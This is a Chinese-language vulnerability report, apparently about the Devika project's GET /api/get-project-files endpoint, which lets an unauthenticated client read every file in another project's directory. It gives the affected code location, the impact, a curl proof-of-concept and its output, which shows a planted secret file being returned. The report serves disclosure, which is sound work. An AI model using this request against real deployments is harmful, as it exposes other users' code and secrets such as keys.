# Devika：未认证跨项目文件读取（GET /api/get-project-files）

## 描述

`GET /api/get-project-files`（src/project.py:148-174）按 `project_name` 参数遍历 `data/projects/<name>/` 目录并返回每个可读文件的完整内容，无认证、无项目属主绑定——项目名即可枚举猜测。

## 影响

任何能访问 1337 端口的网络客户端读取其他项目的全部源码/数据文件（项目目录中可能含 .env、密钥、内部代码）。

## PoC

```bash
# 前提：存在受害者项目 data/projects/victim-project/SECRET.txt（内容 "victim secret data 42"）
curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
```

## 执行结果

```
$ curl "http://127.0.0.1:1337/api/get-project-files?project_name=victim-project"
{"files":[{"code":"victim secret data 42\n","file":"SECRET.txt"}]}
[GET variant HTTP 200]
```
